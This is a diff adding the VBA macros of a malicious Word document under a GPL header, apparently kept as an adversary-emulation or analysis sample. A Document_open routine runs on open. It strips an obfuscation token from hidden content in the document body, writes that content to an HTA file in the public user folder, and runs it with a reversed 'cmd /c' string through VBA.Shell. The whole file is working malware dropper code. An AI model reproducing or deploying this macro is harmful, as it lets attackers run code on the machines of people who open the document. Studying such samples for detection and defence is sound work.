@@ -1,0 +1,45 @@
+<!---------------------------------------------------------------------------------
+Copyright: (c) BLS OPS LLC.
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, version 3.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU General Public License for more details.
+You should have received a copy of the GNU General Public License
+along with this program. If not, see <https://www.gnu.org/licenses/>.
+--------------------------------------------------------------------------------->
+MACRO ThisDocument.cls
+
+Sub document_open()
+au "c:\users\public\compareForFor.hta", " c/ dmc"
+End Sub
+
+MACRO defineBrProc.bas
+Function toIVariable()
+toIVariable = ActiveDocument.Content
+End Function
+Public Sub au(varComps, brComps)
+Set funcCode = New coreIFor
+brComps = funcCode.coreI(brComps)
+htmlFunc = Replace (toIVariable, "0p7ub", vbNullString)
+funcCode.codeIVariable varComps, htmlFunc
+Call VBA.Shell(brComps & varComps)
+End Sub
+
+
+MACRO coreIFor.cls
+
+Public Function coreI(compsProcFunc)
+compareBr = Len(compsProcFunc)
+For i = 0 To compareBr - 1
+compareHtml = compareHtml & Mid(compsProcFunc, (compareBr - i), 1)
+Next
+coreI = compareHtml
+End Function
+Public Sub codeIVariable(forI, compsProcFunc)
+Open forI For Output As #1
+Print #1, compsProcFunc
+Close #1
+End Sub
